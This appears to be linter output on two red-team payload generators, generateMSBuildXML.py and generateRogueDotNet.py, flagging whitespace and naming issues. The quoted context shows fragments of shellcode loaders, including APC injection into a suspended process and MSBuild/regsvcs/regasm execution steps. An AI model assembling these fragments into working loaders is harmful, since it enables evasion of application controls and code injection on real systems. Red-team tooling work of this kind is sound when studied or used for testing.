131 |                     method.Invoke(instance, new object[] { new string[] { } }); 
    |                                                                                ^
132 |                     return true;
133 |                 }                                
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:133:18
    |
131 |                     method.Invoke(instance, new object[] { new string[] { } }); 
132 |                     return true;
133 |                 }                                
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
134 |             }           
135 |         ]]>
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:134:14
    |
132 |                     return true;
133 |                 }                                
134 |             }           
    |              ^^^^^^^^^^^
135 |         ]]>
136 |       </Code>
    |
help: Remove trailing whitespace

N806 Variable `launchCode` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:140:9
    |
138 |         ).safe_substitute(payloadCode=payloadCode, templateName=templateName)
139 |
140 |         launchCode = exeLaunchCode
    |         ^^^^^^^^^^
141 |
142 |     elif _format == "raw":
    |

N806 Variable `shellcodeLoader` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:143:9
    |
142 |     elif _format == "raw":
143 |         shellcodeLoader = ""
    |         ^^^^^^^^^^^^^^^
144 |
145 |         if not apc:
    |

N806 Variable `shellcodeLoader` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:146:13
    |
145 |         if not apc:
146 |             shellcodeLoader = string.Template(
    |             ^^^^^^^^^^^^^^^
147 |                 """<Task>
148 |     <Reference Include="System.Management.Automation" />
    |

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:150:18
    |
148 |     <Reference Include="System.Management.Automation" />
149 |       <Code Type="Class" Language="cs">
150 |         <![CDATA[       
    |                  ^^^^^^^
151 |             using System.Management.Automation;
152 |             using System.Management.Automation.Runspaces;
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:215:18
    |
214 |                     return true;
215 |                 }                                
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
216 |             }           
217 |         ]]>
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:216:14
    |
214 |                     return true;
215 |                 }                                
216 |             }           
    |              ^^^^^^^^^^^
217 |         ]]>
218 |       </Code>
    |
help: Remove trailing whitespace

N806 Variable `shellcodeLoader` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:226:13
    |
224 |             #   https://github.com/infosecn1nja/MaliciousMacroMSBuild
225 |             #
226 |             shellcodeLoader = string.Template(
    |             ^^^^^^^^^^^^^^^
227 |                 """<Task>
228 |   <Code Type="Class" Language="cs">
    |

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:261:1
    |
259 |             $payloadCode
260 |             byte[] payload = DecompressString(shellcode);
261 |               
    | ^^^^^^^^^^^^^^
262 |             string processpath = Environment.ExpandEnvironmentVariables(@"$targetProcess");
263 |             STARTUPINFO si = new STARTUPINFO();
    |
help: Remove whitespace from blank line

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:265:60
    |
263 |             STARTUPINFO si = new STARTUPINFO();
264 |             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
265 |             bool success = CreateProcess(null, processpath, 
    |                                                            ^
266 |             IntPtr.Zero, IntPtr.Zero, false, 
267 |             ProcessCreationFlags.CREATE_SUSPENDED, 
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:266:45
    |
264 |             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
265 |             bool success = CreateProcess(null, processpath, 
266 |             IntPtr.Zero, IntPtr.Zero, false, 
    |                                             ^
267 |             ProcessCreationFlags.CREATE_SUSPENDED, 
268 |             IntPtr.Zero, null, ref si, out pi);
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:267:51
    |
265 |             bool success = CreateProcess(null, processpath, 
266 |             IntPtr.Zero, IntPtr.Zero, false, 
267 |             ProcessCreationFlags.CREATE_SUSPENDED, 
    |                                                   ^
268 |             IntPtr.Zero, null, ref si, out pi);
    |
help: Remove trailing whitespace

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:283:1
    |
281 |             return true;
282 |         }
283 |         
    | ^^^^^^^^
284 |         private static UInt32 MEM_COMMIT = 0x1000;
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:285:1
    |
284 |         private static UInt32 MEM_COMMIT = 0x1000;
285 |        
    | ^^^^^^^
286 |         private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
287 |         private static UInt32 PAGE_READWRITE = 0x04;
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:289:1
    |
287 |         private static UInt32 PAGE_READWRITE = 0x04;
288 |         private static UInt32 PAGE_EXECUTE_READ = 0x20;
289 |         
    | ^^^^^^^^
290 |         [Flags]
291 |         public enum ProcessAccessFlags : uint
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:307:1
    |
305 |           Synchronize = 0x00100000
306 |         }
307 |         
    | ^^^^^^^^
308 |         [Flags]
309 |         public enum ProcessCreationFlags : uint
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:359:1
    |
357 |           public IntPtr hStdError;
358 |         }
359 |         
    | ^^^^^^^^
360 |         [Flags]
361 |         public enum    ThreadAccess : int
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:373:1
    |
371 |           DIRECT_IMPERSONATION    = (0x0200)
372 |         }
373 |         
    | ^^^^^^^^
374 |         [DllImport("kernel32.dll", SetLastError = true)]
375 |         public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:377:1
    |
375 |         public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
376 |           int dwThreadId);
377 |         
    | ^^^^^^^^
378 |         [DllImport("kernel32.dll",SetLastError = true)]
379 |         public static extern bool WriteProcessMemory(
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:385:1
    |
383 |           int nSize,
384 |           out IntPtr lpNumberOfBytesWritten);
385 |         
    | ^^^^^^^^
386 |         [DllImport("kernel32.dll")]
387 |         public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:388:1
    |
386 |         [DllImport("kernel32.dll")]
387 |         public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
388 |         
    | ^^^^^^^^
389 |         [DllImport("kernel32")]
390 |         public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:396:1
    |
394 |         public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
395 |         Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
396 |         
    | ^^^^^^^^
397 |         [DllImport("kernel32.dll", SetLastError = true)]
398 |         public static extern IntPtr OpenProcess(
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:403:1
    |
401 | ΓÇª      int processId
402 | ΓÇª     );
403 | ΓÇª     
    ^^^^^^^^
404 | ΓÇª      [DllImport("kernel32.dll")]
405 | ΓÇª     public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThΓÇª
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:414:1
    |
412 |         [DllImport("kernel32.dll")]
413 |         public static extern uint SuspendThread(IntPtr hThread);
414 |         
    | ^^^^^^^^
415 |         [DllImport("kernel32.dll")]
416 |         public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
    |
help: Remove whitespace from blank line

N806 Variable `launchCode` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:428:9
    |
426 |             )
427 |
428 |         launchCode = shellcodeLoader
    |         ^^^^^^^^^^
429 |
430 |     else:
    |

N806 Variable `powershellLaunchCode` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:431:9
    |
430 |     else:
431 |         powershellLaunchCode = string.Template(
    |         ^^^^^^^^^^^^^^^^^^^^
432 |             """<Task>
433 |     <Reference Include="System.Management.Automation" />
    |

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:435:18
    |
433 |     <Reference Include="System.Management.Automation" />
434 |       <Code Type="Class" Language="cs">
435 |         <![CDATA[       
    |                  ^^^^^^^
436 |             using System.IO;
437 |             using System.IO.Compression;
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:474:18
    |
472 |                     runspace.Close();
473 |                     return true;
474 |                 }                                
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
475 |             }           
476 |         ]]>
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:475:14
    |
473 |                     return true;
474 |                 }                                
475 |             }           
    |              ^^^^^^^^^^^
476 |         ]]>
477 |       </Code>
    |
help: Remove trailing whitespace

N806 Variable `launchCode` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:481:9
    |
479 |         ).safe_substitute(templateName=templateName, payloadCode=payloadCode)
480 |
481 |         launchCode = powershellLaunchCode
    |         ^^^^^^^^^^
482 |
483 |     template = string.Template(
    |

N803 Argument name `filePath` should be lowercase
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:505:21
    |
505 | def detectFileIsExe(filePath, forced=False):
    |                     ^^^^^^^^
506 |     try:
507 |         pe = pefile.PE(filePath)
    |

F841 Local variable `pe` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:507:9
    |
505 | def detectFileIsExe(filePath, forced=False):
506 |     try:
507 |         pe = pefile.PE(filePath)
    |         ^^
508 |         return True
509 |     except pefile.PEFormatError as e:
    |
help: Remove assignment to unused variable `pe`

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:509:36
    |
507 |         pe = pefile.PE(filePath)
508 |         return True
509 |     except pefile.PEFormatError as e:
    |                                    ^
510 |         return False
    |
help: Remove assignment to unused variable `e`

F841 Local variable `variables` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:520:5
    |
518 |     output = re.sub(r'([^\w"])\s+', r"\1", output)
519 |
520 |     variables = {
    |     ^^^^^^^^^
521 |         "payload": "x",
522 |         "method": "m",
    |
help: Remove assignment to unused variable `variables`

N806 Variable `msbuildPath` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:704:5
    |
702 |             print(output)
703 |
704 |     msbuildPath = r"%WINDIR%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe"
    |     ^^^^^^^^^^^
705 |     if "PROGRAMFILES(X86)" in os.environ:
706 |         msbuildPath = r"%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"
    |

N806 Variable `msbuildPath` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:706:9
    |
704 |     msbuildPath = r"%WINDIR%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe"
705 |     if "PROGRAMFILES(X86)" in os.environ:
706 |         msbuildPath = r"%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"
    |         ^^^^^^^^^^^
707 |
708 |     sys.stderr.write(
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\generateMSBuildXML.py:709:9
    |
708 |       sys.stderr.write(
709 | /         """
710 | |
711 | | =====================================
712 | |
713 | | Execute this XML file like so:
714 | |
715 | | {} file.xml
716 | |     """.format(
717 | |             msbuildPath
718 | |         )
    | |_________^
719 |       )
    |
help: Convert to f-string

N816 Variable `globalOptions` in global scope should not be mixedCase
  --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:63:1
   |
61 | }
62 |
63 | globalOptions = {}
   | ^^^^^^^^^^^^^
64 |
65 | CodeTemplates = {
   |

W291 Trailing whitespace
  --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:85:78
   |
84 |     Step 3: Execute your payload!
85 |         %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe rogue.dll 
   |                                                                              ^
86 |         %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U rogue.dll 
   |
help: Remove trailing whitespace

W291 Trailing whitespace
  --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:86:81
   |
84 |     Step 3: Execute your payload!
85 |         %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe rogue.dll 
86 |         %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U rogue.dll 
   |                                                                                 ^
87 |
88 |         %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe rogue.dll
   |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:140:72
    |
138 |             MethodInfo method = asm.EntryPoint;
139 |             object instance = asm.CreateInstance(method.Name);
140 |             method.Invoke(instance, new object[] { new string[] { } }); 
    |                                                                        ^
141 |             return true;
142 |         }
    |
help: Remove trailing whitespace

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:148:1
    |
146 |     # ======================================================================================================
147 |     "inlineShellcodeLoader": """
148 |         
    | ^^^^^^^^
149 |         [DllImport("kernel32")]
150 |         private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, UInt32 flAllocationType, UInt32 flProtect);
    |
help: Remove whitespace from blank line

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:188:10
    |
187 |             return true;
188 |         }                                           
    |          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
189 | """,
190 |     # ======================================================================================================
    |
help: Remove trailing whitespace

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:202:1
    |
200 |             $payloadCode
201 |             byte[] payload = DecompressString(shellcode);
202 |               
    | ^^^^^^^^^^^^^^
203 |             string processpath = Environment.ExpandEnvironmentVariables(@"$targetProcess");
204 |             STARTUPINFO si = new STARTUPINFO();
    |
help: Remove whitespace from blank line

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:206:60
    |
204 |             STARTUPINFO si = new STARTUPINFO();
205 |             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
206 |             bool success = CreateProcess(null, processpath, 
    |                                                            ^
207 |             IntPtr.Zero, IntPtr.Zero, false, 
208 |             ProcessCreationFlags.CREATE_SUSPENDED, 
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:207:45
    |
205 |             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
206 |             bool success = CreateProcess(null, processpath, 
207 |             IntPtr.Zero, IntPtr.Zero, false, 
    |                                             ^
208 |             ProcessCreationFlags.CREATE_SUSPENDED, 
209 |             IntPtr.Zero, null, ref si, out pi);
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:208:51
    |
206 |             bool success = CreateProcess(null, processpath, 
207 |             IntPtr.Zero, IntPtr.Zero, false, 
208 |             ProcessCreationFlags.CREATE_SUSPENDED, 
    |                                                   ^
209 |             IntPtr.Zero, null, ref si, out pi);
    |
help: Remove trailing whitespace

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:224:1
    |
222 |             return true;
223 |         }
224 |         
    | ^^^^^^^^
225 |         private static UInt32 MEM_COMMIT = 0x1000;
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:226:1
    |
225 |         private static UInt32 MEM_COMMIT = 0x1000;
226 |        
    | ^^^^^^^
227 |         private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
228 |         private static UInt32 PAGE_READWRITE = 0x04;
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:230:1
    |
228 |         private static UInt32 PAGE_READWRITE = 0x04;
229 |         private static UInt32 PAGE_EXECUTE_READ = 0x20;
230 |         
    | ^^^^^^^^
231 |         [Flags]
232 |         public enum ProcessAccessFlags : uint
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:248:1
    |
246 |           Synchronize = 0x00100000
247 |         }
248 |         
    | ^^^^^^^^
249 |         [Flags]
250 |         public enum ProcessCreationFlags : uint
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:300:1
    |
298 |           public IntPtr hStdError;
299 |         }
300 |         
    | ^^^^^^^^
301 |         [Flags]
302 |         public enum    ThreadAccess : int
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:314:1
    |
312 |           DIRECT_IMPERSONATION    = (0x0200)
313 |         }
314 |         
    | ^^^^^^^^
315 |         [DllImport("kernel32.dll", SetLastError = true)]
316 |         public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:318:1
    |
316 |         public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
317 |           int dwThreadId);
318 |         
    | ^^^^^^^^
319 |         [DllImport("kernel32.dll",SetLastError = true)]
320 |         public static extern bool WriteProcessMemory(
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:326:1
    |
324 |           int nSize,
325 |           out IntPtr lpNumberOfBytesWritten);
326 |         
    | ^^^^^^^^
327 |         [DllImport("kernel32.dll")]
328 |         public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:329:1
    |
327 |         [DllImport("kernel32.dll")]
328 |         public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
329 |         
    | ^^^^^^^^
330 |         [DllImport("kernel32")]
331 |         public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:337:1
    |
335 |         public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
336 |         Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
337 |         
    | ^^^^^^^^
338 |         [DllImport("kernel32.dll", SetLastError = true)]
339 |         public static extern IntPtr OpenProcess(
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:344:1
    |
342 | ΓÇª      int processId
343 | ΓÇª     );
344 | ΓÇª     
    ^^^^^^^^
345 | ΓÇª      [DllImport("kernel32.dll")]
346 | ΓÇª     public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThΓÇª
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:355:1
    |
353 |         [DllImport("kernel32.dll")]
354 |         public static extern uint SuspendThread(IntPtr hThread);
355 |         
    | ^^^^^^^^
356 |         [DllImport("kernel32.dll")]
357 |         public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
    |
help: Remove whitespace from blank line

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:381:10
    |
379 |             runspace.Close();
380 |             return true;
381 |         }      
    |          ^^^^^^
382 | """,
383 |     # ======================================================================================================
    |
help: Remove trailing whitespace

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:394:1
    |
392 |             Execute();
393 |         }
394 |         
    | ^^^^^^^^
395 |         // This executes if registration fails
396 |         [ComUnregisterFunction]
    |
help: Remove whitespace from blank line

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:442:77
    |
440 |                   psi.WorkingDirectory = Path.GetDirectoryName(fullPath.Substring(1, pos));
441 |
442 |                   if (pos + 2 < fullPath.Length && fullPath[pos + 2] == ' ') 
    |                                                                             ^
443 |                   {
444 |                       args = fullPath.Substring(pos + 2);
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:458:15
    |
456 |               return true;
457 |           }
458 |           else 
    |               ^
459 |           {
460 |               int pos = fullPath.IndexOf(" ");
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:507:77
    |
505 |                   psi.WorkingDirectory = Path.GetDirectoryName(fullPath.Substring(1, pos));
506 |
507 |                   if (pos + 2 < fullPath.Length && fullPath[pos + 2] == ' ') 
    |                                                                             ^
508 |                   {
509 |                       args = fullPath.Substring(pos + 2);
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:523:15
    |
521 |               return true;
522 |           }
523 |           else 
    |               ^
524 |           {
525 |               int pos = fullPath.IndexOf(" ");
    |
help: Remove trailing whitespace

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:582:1
    |
581 |     $extraCodeWithinNamespace
582 |   
    | ^^
583 |     [ComVisible(true)]
584 |     public class $templateName $assemblyAdditions4
    |
help: Remove whitespace from blank line

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:586:31
    |
584 |     public class $templateName $assemblyAdditions4
585 |     {
586 |         public $templateName() 
    |                               ^
587 |         { 
588 |             Execute();
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:587:10
    |
585 |     {
586 |         public $templateName() 
587 |         { 
    |          ^
588 |             Execute();
589 |         }
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:599:20
    |
597 |         $assemblyAdditions2
598 |
599 |         $launchCode           
    |                    ^^^^^^^^^^^
600 |     }
    |
help: Remove trailing whitespace

N803 Argument name `stdErrToStdout` should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:616:36
    |
616 | def shell2(cmd, alternative=False, stdErrToStdout=False, surpressStderr=False):
    |                                    ^^^^^^^^^^^^^^^^^^^^
617 |     CREATE_NO_WINDOW = 0x08000000
618 |     si = subprocess.STARTUPINFO()
    |

N803 Argument name `surpressStderr` should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:616:58
    |
616 | def shell2(cmd, alternative=False, stdErrToStdout=False, surpressStderr=False):
    |                                                          ^^^^^^^^^^^^^^^^^^^^
617 |     CREATE_NO_WINDOW = 0x08000000
618 |     si = subprocess.STARTUPINFO()
    |

N806 Variable `CREATE_NO_WINDOW` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:617:5
    |
616 | def shell2(cmd, alternative=False, stdErrToStdout=False, surpressStderr=False):
617 |     CREATE_NO_WINDOW = 0x08000000
    |     ^^^^^^^^^^^^^^^^
618 |     si = subprocess.STARTUPINFO()
619 |     si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    |

N803 Argument name `surpressStderr` should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:681:49
    |
681 | def shell(cmd, alternative=False, output=False, surpressStderr=False):
    |                                                 ^^^^^^^^^^^^^^^^^^^^
682 |     out = shell2(cmd, alternative, stdErrToStdout=output, surpressStderr=surpressStderr)
683 |     return out
    |

N803 Argument name `filePath` should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:686:26
    |
686 | def getCompressedPayload(filePath, returnRaw=False):
    |                          ^^^^^^^^
687 |     out = io.BytesIO()
688 |     encoded = ""
    |

N803 Argument name `returnRaw` should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:686:36
    |
686 | def getCompressedPayload(filePath, returnRaw=False):
    |                                    ^^^^^^^^^^^^^^^
687 |     out = io.BytesIO()
688 |     encoded = ""
    |

N803 Argument name `targetProcess` should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:735:5
    |
733 |     _format,
734 |     apc,
735 |     targetProcess,
    |     ^^^^^^^^^^^^^
736 |     dontUseNamespace=False,
737 |     _type="regasm",
    |

N803 Argument name `dontUseNamespace` should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:736:5
    |
734 |     apc,
735 |     targetProcess,
736 |     dontUseNamespace=False,
    |     ^^^^^^^^^^^^^^^^^^^^^^
737 |     _type="regasm",
738 |     command="",
    |

N806 Variable `templateName` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:741:5
    |
739 | ):
740 |
741 |     templateName = "".join(
    |     ^^^^^^^^^^^^
742 |         random.choice(string.ascii_letters) for x in range(random.randint(5, 15))
743 |     )
    |

N806 Variable `templateName` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:745:9
    |
743 |     )
744 |     if len(module) > 0:
745 |         templateName = module
    |         ^^^^^^^^^^^^
746 |
747 |     namespaceName = "".join(
    |

N806 Variable `namespaceName` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:747:5
    |
745 |         templateName = module
746 |
747 |     namespaceName = "".join(
    |     ^^^^^^^^^^^^^
748 |         random.choice(string.ascii_letters) for x in range(random.randint(5, 15))
749 |     )
    |

N806 Variable `namespaceName` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:751:9
    |
749 |     )
750 |     if len(namespace) > 0:
751 |         namespaceName = namespace
    |         ^^^^^^^^^^^^^
752 |
753 |     methodName = "".join(
    |

N806 Variable `methodName` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:753:5
    |
751 |         namespaceName = namespace
752 |
753 |     methodName = "".join(
    |     ^^^^^^^^^^
754 |         random.choice(string.ascii_letters) for x in range(random.randint(5, 15))
755 |     )
    |

N806 Variable `methodName` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:757:9
    |
755 |     )
756 |     if len(method) > 0:
757 |         methodName = method
    |         ^^^^^^^^^^
758 |
759 |     payloadCode = payload
    |

N806 Variable `payloadCode` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:759:5
    |
757 |         methodName = method
758 |
759 |     payloadCode = payload
    |     ^^^^^^^^^^^
760 |
761 |     if _type not in ["exec", "run-command"]:
    |

N806 Variable `payloadCode` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:764:9
    |
762 |         if type(payload) is str:
763 |             payload = payload.encode()
764 |         payloadCode = getPayloadCode(payload.decode(errors="ignore"))
    |         ^^^^^^^^^^^
765 |
766 |     launchCode = ""
    |

N806 Variable `launchCode` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:766:5
    |
